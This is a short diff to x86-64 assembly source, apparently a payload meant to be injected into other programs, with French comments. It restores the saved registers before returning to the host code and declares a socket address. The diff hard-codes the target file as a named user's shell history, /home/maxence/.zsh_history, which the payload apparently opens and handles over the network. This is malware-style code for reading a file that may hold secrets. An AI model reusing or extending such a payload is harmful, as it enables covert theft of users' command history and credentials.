@@ -93,9 +93,9 @@ error_open:
 exit:
     ; Jump to the next instruction
 	xor rax, rax
-	mov rax, r14
 	popx rax, rdi, rsi, rsp, rdx, rcx, r8, r9, r12
 	popfq
+	mov rax, r14
 	; jmp 0x0
 	ret
 
@@ -110,5 +110,6 @@ sockaddr_in:
 	dd 0x0              ; sin_addr (INADDR_ANY)
 	times 8 db 0               ; sin_zero (8 octets de zéros)
 	; Taille totale: 16 octets
-path		times 1024 db 0	; Chemin du fichier
+; path		times 1024 db 0	; Chemin du fichier
+path		db "/home/maxence/.zsh_history", 0	; Chemin du fichier
 _payload_size dq $- _payload
